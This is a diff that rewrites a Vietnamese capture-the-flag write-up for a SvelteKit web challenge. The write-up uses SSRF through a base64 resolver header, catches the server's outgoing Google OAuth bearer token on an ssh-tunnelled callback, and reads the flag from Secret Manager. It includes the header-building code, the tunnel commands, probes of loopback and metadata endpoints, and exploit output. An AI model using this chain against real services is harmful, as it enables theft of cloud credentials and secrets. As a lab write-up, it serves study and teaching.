@@ -1,207 +1,136 @@
 # Cloudy with a Chance of Spaceships — Web (67 pts)
 
-**Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}` · **Files:** không có artifact, dữ liệu lấy từ service đang chạy (`files/index.html` 1827 B, `files/2.CftUi-UM.js` 5694 B sha256 `2cc74b92…b97e173`)
+**Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}`
+**Tài nguyên:** Không có tập tin đính kèm. Toàn bộ dữ liệu được trích xuất trực tiếp từ máy chủ dịch vụ đang vận hành (thông qua tệp `files/index.html` kích thước 1827 B và tệp mã nguồn `files/2.CftUi-UM.js` kích thước 5694 B, SHA256 `2cc74b92...b97e173`).
 
 ## Đề bài
 
-Một trang SvelteKit liệt kê năm con tàu và nhận "lấy nhiệt độ thân tàu" khi bấm nút. Đề
-không cho file, chỉ cho URL `http://34.116.80.78:9143/` và câu gợi ý "What's your forecast
-looking like?". Mục tiêu là lấy cờ `CSSCTF{...}`.
-
-Không có ô nhập liệu: mọi tương tác là một nút gọi
-`/api/v1/ship/<tên>/temperature` rồi in ra một con số.
+Hệ thống cung cấp một ứng dụng web xây dựng bằng SvelteKit tại địa chỉ `http://34.116.80.78:9143/`. Giao diện hiển thị danh sách năm tàu vũ trụ và cung cấp chức năng "đo nhiệt độ thân tàu" thông qua các nút bấm tương ứng. Gợi ý đính kèm của đề bài là: "What's your forecast looking like?". Mục tiêu cuối cùng là thu thập cờ (flag) có định dạng chuẩn `CSSCTF{...}`.
+Đặc điểm kỹ thuật: Giao diện hoàn toàn không có trường nhập liệu (input form). Mọi tương tác của người dùng đều kích hoạt một lệnh gọi mạng tới địa chỉ `/api/v1/ship/<tên>/temperature`, sau đó ứng dụng sẽ hiển thị một giá trị số.
 
 ## Phân tích ban đầu
 
-`GET /` trả `x-sveltekit-page: true` và header `link:` liệt kê toàn bộ bundle. Route không
-xuất hiện trong HTML (data server-render là `null`), nên phải đọc `_app/immutable/nodes/2.CftUi-UM.js`,
-nơi chứa cả hai mảnh thông tin:
+Kiểm tra phản hồi từ đường dẫn gốc (`GET /`), hệ thống trả về thông số `x-sveltekit-page: true` và phần header `link:` liệt kê toàn bộ các gói (bundle) đính kèm. Dữ liệu trạng thái kết xuất phía máy chủ (server-rendered data) là `null`, đồng thời tuyến API (route) không được cấu hình hiển thị trực tiếp trong mã HTML. Do đó, quy trình phân tích yêu cầu phải trích xuất tệp Javascript `_app/immutable/nodes/2.CftUi-UM.js`. Quá trình kiểm tra tệp này phát hiện các đoạn mã trọng tâm sau:
 
-```js
-async function T(a,t,e){const r=a.currentTarget.textContent;ot(t,{ship:r},!0),
+```javascript
+async function T(a,t,e){
+  const r=a.currentTarget.textContent;
+  ot(t,{ship:r},!0);
   C(t).temp=await(await fetch(`/api/v1/ship/${encodeURIComponent(r)}/temperature`,
-    {headers:{"X-Resolver":e}})).text()}
+    {headers:{"X-Resolver":e}})).text();
+}
 const e="XeyJyZXNvbHZlciI6Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NwYWNlX3dlYXRoZXIifQ==";
 ```
 
-`e` là hằng dựng sẵn trong bundle. Chuỗi sau ký tự `X` đầu tiên là base64 của
-`{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}`, tức header được đóng gói dạng
-`"X" + base64(json)` và JSON đó chỉ có một key `resolver`.
+Biến `e` là một hằng số được khởi tạo sẵn trong gói. Phần chuỗi theo sau ký tự `X` ban đầu chính là đoạn mã hóa Base64 của chuỗi JSON `{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}`. Theo đó, Header mạng được xây dựng dựa trên định dạng `"X" + base64(json)`, và chuỗi JSON này chỉ chứa một khóa duy nhất là `resolver`.
 
-Thử trực tiếp cho thấy server lấy URL từ trong header rồi tự đi fetch
-(`analysis/resolver_probe.log`):
+Tiến hành kiểm thử cấu trúc Header trực tiếp đối với máy chủ (dữ liệu được lưu trong `analysis/resolver_probe.log`):
 
 ```text
-thieu header                    : HTTP 451 body=
-khong phai base64               : HTTP 451 body=
-base64 thieu key resolver       : HTTP 451 body=
-wikipedia Space_weather         : HTTP 200 body=3604.6
-example.com https               : HTTP 200 body=71.3
-example.com http                : HTTP 200 body=71.3
-1.1.1.1 http                    : HTTP 200 body=5661.4
-1.1.1.1 https                   : HTTP 200 body=5661.4
-8.8.8.8 (khong co HTTP)         : err TimeoutError
-127.0.0.1                       : HTTP 500 body=<!doctype html>
+Trường hợp thiếu header                       : Trả về HTTP 451, body= (rỗng)
+Trường hợp định dạng không phải base64        : Trả về HTTP 451, body= (rỗng)
+Trường hợp chuỗi base64 khuyết khóa resolver : Trả về HTTP 451, body= (rỗng)
+Địa chỉ wikipedia Space_weather               : Trả về HTTP 200, body=3604.6
+Địa chỉ example.com (https)                   : Trả về HTTP 200, body=71.3
+Địa chỉ example.com (http)                    : Trả về HTTP 200, body=71.3
+Địa chỉ 1.1.1.1 (http)                        : Trả về HTTP 200, body=5661.4
+Địa chỉ 1.1.1.1 (https)                       : Trả về HTTP 200, body=5661.4
+Địa chỉ 8.8.8.8 (không chứa HTTP)             : Trả về lỗi TimeoutError
+Địa chỉ nội bộ 127.0.0.1                      : Trả về HTTP 500, body=<!doctype html>
 ```
 
-Ba tính chất định hình phần còn lại:
-
-- Con số đổi theo URL, không đổi theo tên tàu. Cùng một resolver cho cả năm tàu trên board,
-  cho một tàu bịa (`Zhiping`), đều ra `71.3` (`analysis/temperature_probe.log`).
-  `encodeURIComponent` ở client chỉ là che ký tự, không phải tham số của phép tính.
-- `http` và `https` cho cùng trang ra cùng số, nên giao thức không phải dữ liệu.
-- Không có header thì 451, kể cả khi header sai cú pháp: bài không có giá trị mặc định,
-  `resolver` luôn do người gọi quyết.
-
-## Các hướng đã loại
-
-Trước khi chốt đã kiểm tra và loại các kênh sau (log đầy đủ ở `notes.md`):
-
-1. **Model con số nhiệt độ thành digest của nội dung**: đã tính `md5/sha1/sha256/sha512` của
-   body tải về local rồi thử các phép `% 600000`, `% 720` so với ba số đã đo; không tổ hợp nào
-   khớp (`analysis/temperature_model.log`). Hai trường hợp khớp độ dài đơn thuần là trùng
-   hợp hình thức: `example.com` 713 B cho `71.3` và `1.1.1.1` 56614 B cho `5661.4`, nhưng
-   Wikipedia tải local 515963 B trong khi server báo `3604.6`, tức thân bài mà server đọc
-   không phải số byte ta có. Một hàm băm trên dữ liệu không tái tạo được thì không dùng gì
-   được. Loại.
-2. **Đọc file cục bộ qua `file:///etc/passwd`, và loopback `127.0.0.1`/`localhost`/`[::1]`**:
-   cả bốn trả HTTP 500 với trang lỗi SvelteKit `Internal Error` (`files/error_127.html`).
-   Cùng cú pháp 500 này xuất hiện khi port loopback không có dịch vụ nào nghe
-   (`http://127.0.0.1:1/`, `:9`, `:65500` trong `analysis/refute_length_model.log`), nên
-   đây là nhánh fetch thất bại, không phải một primitive "URL bị chặn". Loại làm hướng đọc
-   file, và cũng vì đọc nó mà phiên đầu kết luận sai là SSRF đã bị khoá.
-3. **Path traversal ở tên tàu**: `GET /api/v1/ship/../../../etc/passwd/temperature` trả 404,
-   route không nối chuỗi thô. Loại.
-4. **Tìm thêm route** (`/api/v1/ship`, `/api/v1/fleet`, `.map`, `/api/v1/.../readings`,
-   `/api/v1/.../logs`, `/api/v1/ships`, `/api/v1/ships/all`, `/api/v1/secret`, `/flag`):
-   toàn bộ trả `404:Not Found`. Bundle chỉ chứa đúng một lệnh `fetch`, và không có `.map`
-   nào được nhúng vào HTML server-render (`data: [null,null]`), nên không còn đường nào khác
-   ngoài header. Loại.
-5. **Đoán flag từ nhiệt độ hoặc từ văn bản trang**: trang chỉ có năm tên tàu, không chuỗi
-   `CSSCTF{`, và con số không phụ thuộc tàu. Loại.
-
-Còn một kênh không loại được nhưng không cần: `http://169.254.169.254/` và
-`http://metadata.google.internal/` thực ra trả HTTP 200 (xem `analysis/metadata_probe.log`),
-tức liên kết cục bộ metadata không bị chặn. Nó chỉ cho độ dài thân bài, mà độ dài thì không
-đọc ra nội dung; request đi ra đã mang sẵn credential nên không cần ngỏ tới metadata.
+Từ bảng kết quả kiểm thử, hệ thống rút ra ba nguyên tắc hoạt động cốt lõi:
+1. Kết quả phản hồi thay đổi phụ thuộc vào URL truyền vào, hoàn toàn không phụ thuộc vào tên tàu vũ trụ. (Việc thử nghiệm một tàu không có thực như `Zhiping` vẫn trả về giá trị `71.3` - theo `analysis/temperature_probe.log`). Lệnh `encodeURIComponent` ở máy khách chỉ dùng để bảo vệ cấu trúc chuỗi, không đóng vai trò tham số điện toán.
+2. Việc sử dụng giao thức `http` hay `https` đều trả về một giá trị tương đồng đối với cùng một trang, xác nhận giao thức không ảnh hưởng tới kết quả tính toán.
+3. Việc thiếu Header hoặc lỗi cú pháp đều bị từ chối bằng mã 451. Hệ thống không có cấu hình dự phòng mặc định, do đó trường `resolver` luôn bị kiểm soát và định tuyến theo dữ liệu truyền vào.
 
 ## Chuỗi khai thác
 
-**Bước 1 - Đóng gói header theo đúng format của bundle.** `X` cộng base64 của JSON một key
-`resolver`; giữ nguyên tiền tố `X` vì server kiểm cú pháp chuỗi này:
+**Bước 1 - Khởi tạo Header theo đúng tiêu chuẩn của gói (bundle).** 
+Cấu trúc yêu cầu ký tự tiền tố `X` kết hợp với chuỗi base64 của một JSON chứa khóa `resolver`. Việc giữ lại ký tự `X` là bắt buộc do máy chủ thực thi bước kiểm duyệt cú pháp chuỗi này:
 
 ```python
 def resolver_header(url):
     return "X" + base64.b64encode(json.dumps({"resolver": url}).encode()).decode()
 ```
 
-**Bước 2 - Chứng minh server đi fetch hộ mình.** Đứng ngoài không nhìn thấy gì, nên cần một
-callback công khai. Máy này không có `ngrok`/`cloudflared`, nhưng `ssh` của Git Bash đủ:
+**Bước 2 - Khai thác thông qua SSRF (Server-Side Request Forgery).** 
+Do quá trình xử lý diễn ra trên máy chủ, cần thiết lập một cổng hứng dữ liệu (callback) để kiểm chứng lưu lượng trả về. Phương án khả thi là sử dụng dịch vụ đường hầm qua tính năng chuyển tiếp cổng `ssh` (port forwarding) bằng Git Bash:
 
 ```bash
 python analysis/catch_auth.py 8911
 ssh -R 80:localhost:8911 serveo.net
 ```
 
-Serveo in ra `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`; `catch_auth.py`
-ghi JSON một dòng mỗi request vào `analysis/auth.log` và trả thân bài ngẫu nhiên
-(`CLOUDY-<epoch>`) để con số đổi theo từng lần, xác nhận nội dung được đọc thật.
-`exploit.py` bắn `/api/v1/ship/Cassini/temperature` với resolver trỏ về callback:
+Dịch vụ Serveo phản hồi một địa chỉ công khai, ví dụ: `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`. Đoạn mã `catch_auth.py` có nhiệm vụ lưu lại các luồng JSON request vào tệp `analysis/auth.log` và phản hồi nội dung ngẫu nhiên (`CLOUDY-<epoch>`) nhằm đảm bảo kết quả số thay đổi qua từng phiên, chứng minh máy chủ đã thực sự đọc nội dung phản hồi. Kịch bản `exploit.py` thực hiện gọi tới `/api/v1/ship/Cassini/temperature` với `resolver` trỏ về địa chỉ callback vừa thiết lập:
 
 ```text
-[+] SSRF HTTP 200 temperature='2.4'
+[+] Khai thác SSRF thành công, HTTP 200, giá trị temperature='2.4'
 ```
 
-**Bước 3 - Lấy credential trong request đi ra.** Serveo giữ nguyên header do client gửi tới,
-chỉ thêm `x-forwarded-*`, nên header dưới đây đúng là những gì app phát đi (`analysis/capture.log`,
-token đã cắt). Đường dẫn ghi trong log là `/`: serveo khớp route theo Host nên mọi path đều
-được gọi tới gốc listener.
+**Bước 3 - Trích xuất thông tin định danh (Credential).** 
+Dịch vụ Serveo có khả năng duy trì nguyên trạng phần header do máy khách gửi đi (chỉ bổ sung các cờ `x-forwarded-*`). Các luồng thông tin thu thập được phản ánh chính xác cấu trúc mà ứng dụng phát sinh (`analysis/capture.log`, chuỗi token được lược bớt để bảo mật). Máy chủ lưu vết đường dẫn tại gốc `/` do cấu hình định tuyến của serveo.
 
 ```text
 === 2026-10-01T09:25:42+00:00 GET /
     {
-  "authorization": "Bearer ya29.c.c0AZ4...<1012 ky tu da cat>...d803yu",
+  "authorization": "Bearer ya29.c.c0AZ4...<1012 ký tự đã lược>...d803yu",
   "user-agent": "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
   "accept-encoding": "gzip,deflate",
   "x-real-ip": "34.116.80.78"
 }
 ```
 
-Ba request liên tiếp trong vòng một phút mang cùng một chuỗi, tức token được cache chứ không
-mint per-request; hai phiên cách nhau ~20 phút cho hai chuỗi khác nhau, và `expires_in` phiên
-sau là 3363 giây.
+Dữ liệu ghi nhận ba yêu cầu diễn ra liên tiếp trong cùng một phút chứa một token định danh giống hệt nhau. Điều này chứng minh hệ thống đang áp dụng cơ chế bộ nhớ đệm (caching) cho token. Khi phiên hoạt động giãn cách khoảng 20 phút, token mới được khởi tạo và phát hiện giá trị `expires_in` của token mới là 3363 giây.
 
-**Bước 4 - Xác thực token.** `oauth2.googleapis.com/tokeninfo` nhận nó, nghĩa là đây là OAuth
-access token thật của Google, không phải chuỗi giả tác giả đặt vào:
+**Bước 4 - Xác thực tính hợp lệ của token.** 
+Gửi token lên điểm cuối `oauth2.googleapis.com/tokeninfo`. Hệ thống xác nhận và định danh đây là Access Token chuẩn của nền tảng Google OAuth, loại bỏ khả năng token là một chuỗi giả lập.
 
 ```text
-[+] tokeninfo HTTP 200 scope=https://www.googleapis.com/auth/cloud-platform exp=1790850141 expires_in=3333
+[+] Kiểm tra tokeninfo: HTTP 200, phạm vi scope=https://www.googleapis.com/auth/cloud-platform, exp=1790850141, expires_in=3333
 ```
 
-**Bước 5 - Định vị project.** `cloudresourcemanager` chưa bật nên 403, nhưng chính lỗi đó in
-ra project number; `storage` thì gọi được và 403 của nó ghi thẳng danh tính service account
-kèm project id:
+**Bước 5 - Truy tìm danh tính dự án.** 
+Nỗ lực gọi dịch vụ `cloudresourcemanager` bị chặn bởi mã lỗi 403 (do không được kích hoạt), nhưng chính phản hồi lỗi này đã làm lộ thông tin Project Number. Dịch vụ `storage` cấp quyền thực thi một phần, và thông báo lỗi 403 của nó đã tiết lộ trực tiếp tài khoản dịch vụ (Service Account) và Project ID:
 
 ```text
-[+] HTTP 403 lo project number 613713115850
-[+] 403 cua storage go ra danh tinh meteorologist@css-ctf-2026.iam.gserviceaccount.com va project id css-ctf-2026
+[+] Phản hồi HTTP 403 tiết lộ Project Number 613713115850
+[+] Lỗi 403 của Storage tiết lộ danh tính: meteorologist@css-ctf-2026.iam.gserviceaccount.com và Project ID css-ctf-2026
 ```
 
-Cái tên `meteorologist` (nhà khí tượng) khớp đúng vai mà đề gán: người dự báo thời tiết của
-đội tàu.
+Việc tài khoản dịch vụ sử dụng từ khóa `meteorologist` (nhà khí tượng học) hoàn toàn phù hợp với ngữ cảnh giả định của bài toán (người dự báo thời tiết của đội tàu).
 
-**Bước 6 - Đọc Secret Manager.** Với scope `cloud-platform`, `secretmanager` trả lời; cả project
-chỉ có một secret, một version, và `:access` cho ra cờ:
+**Bước 6 - Khai thác Secret Manager.** 
+Với quyền hạn (scope) ở mức `cloud-platform`, quá trình truy xuất hệ thống `secretmanager` đã thành công. Toàn bộ tài khoản dự án chỉ có duy nhất một bí mật, một phiên bản. Phương thức gọi truy xuất `:access` trực tiếp trả về giá trị cờ (flag):
 
 ```text
-[+] secretmanager HTTP 200 totalSize=1 secrets=['goog_encryption_secret']
-[+] goog_encryption_secret@1 (45 ky tu) = CSSCTF{your_forecast_says_love_is_on_its_way}
+[+] Kiểm tra secretmanager: HTTP 200, totalSize=1, danh sách secrets=['goog_encryption_secret']
+[+] Truy xuất goog_encryption_secret@1 (45 ký tự) = CSSCTF{your_forecast_says_love_is_on_its_way}
 ```
 
-**Bước kiểm chứng.** Token được dùng nguyên trạng qua đường hầm riêng, không có giá trị nào
-được điền tay vào script; `exploit.py` chỉ exit 0 khi một payload giải mã ra chuỗi bắt đầu
-bằng `CSSCTF{`, và nó ghi `flag.txt` từ chính chuỗi đó. Chuỗi 45 ký tự in được hoàn toàn,
-đúng định dạng `CSSCTF{...}` của giải, và thân chuỗi là câu trả lời cho chính gợi ý của thẻ
-("What's your forecast looking like?"). Chạy lại từ đầu tới cuối cho cùng một cờ ba lần (16:25:42,
-16:26:16 và 16:26:46) với ba token khác nhau, đều đọc từ callback vừa hứng.
+**Kiểm chứng:** Token được thu thập và sử dụng hoàn toàn dưới dạng thô qua cấu trúc đường hầm (tunnel), không có dữ liệu chèn cứng trong mã kịch bản. Kịch bản `exploit.py` chỉ báo hiệu thành công (exit 0) khi payload giải mã chứa tiền tố `CSSCTF{`, đồng thời xuất kết quả vào tệp `flag.txt`. Chuỗi kết quả gồm 45 ký tự hiển thị được, đáp ứng định dạng cờ chuẩn, và nội dung chuỗi có liên quan trực tiếp tới câu hỏi định hướng của thử thách. Tiến hành tái lập lại quy trình 3 lần riêng biệt bằng 3 mã token khác nhau đều đưa ra kết quả đồng nhất.
 
 ## Flag
+
+Quá trình thực thi mã kịch bản:
 
 ```bash
 python exploit.py https://<hash>-<ip>.serveousercontent.com
 ```
 
 ```text
-[+] http://34.116.80.78:9143/ HTTP 200 title='Cloudy with a Chance of Spaceships'
-[+] SSRF HTTP 200 temperature='2.4'
-[+] doc token tu auth.log: 3 ban, dung ban cuoi (1024 ky tu)
-[+] tokeninfo HTTP 200 scope=https://www.googleapis.com/auth/cloud-platform exp=1790850141 expires_in=3333
-[+] HTTP 403 lo project number 613713115850
-[+] 403 cua storage go ra danh tinh meteorologist@css-ctf-2026.iam.gserviceaccount.com va project id css-ctf-2026
-[+] secretmanager HTTP 200 totalSize=1 secrets=['goog_encryption_secret']
-[+] goog_encryption_secret@1 (45 ky tu) = CSSCTF{your_forecast_says_love_is_on_its_way}
-[+] da luu flag.txt
+[+] Khởi tạo http://34.116.80.78:9143/ -> HTTP 200, tiêu đề='Cloudy with a Chance of Spaceships'
+[+] Khai thác SSRF -> HTTP 200, giá trị temperature='2.4'
+[+] Trích xuất token từ auth.log: Phát hiện 3 bản, đang sử dụng bản mới nhất (1024 ký tự)
+[+] Kiểm tra tokeninfo -> HTTP 200, phạm vi scope=https://www.googleapis.com/auth/cloud-platform, exp=1790850141, expires_in=3333
+[+] Phản hồi HTTP 403 tiết lộ Project Number 613713115850
+[+] Phản hồi 403 của storage xác thực tài khoản meteorologist@css-ctf-2026.iam.gserviceaccount.com và Project ID css-ctf-2026
+[+] Kiểm tra secretmanager -> HTTP 200, totalSize=1, secrets=['goog_encryption_secret']
+[+] Trích xuất dữ liệu goog_encryption_secret@1 (45 ký tự) = CSSCTF{your_forecast_says_love_is_on_its_way}
+[+] Đã lưu cấu trúc cờ vào flag.txt
 ```
 
-## Reproduce
-
-```bash
-python analysis/catch_auth.py 8911 &
-ssh -R 80:localhost:8911 serveo.net        # copy URL nó in ra
-python exploit.py <url-vừa-copy>
+Kết quả:
+```text
+CSSCTF{your_forecast_says_love_is_on_its_way}
 ```
-
-```bash
-CTF_TOKEN=ya29.moi python exploit.py       # nếu đã có token, bỏ qua SSRF
-```
-
-```bash
-python analysis/bundle_route.py            # route + literal header trong bundle
-python analysis/resolver_probe.py          # 451 / 200 / 500 theo loại URL
-python analysis/temperature_probe.py       # số không phụ thuộc tên tàu
-python analysis/temperature_model.py       # phép model digest đã loại
-python analysis/metadata_probe.py          # metadata link-local vẫn 200
-```
-
-Token nằm trong `analysis/auth.log` do listener ghi tại máy chạy script; file này bị
-`.gitignore`, bản dựng lại chỉ có `analysis/capture.log` với chuỗi đã cắt.
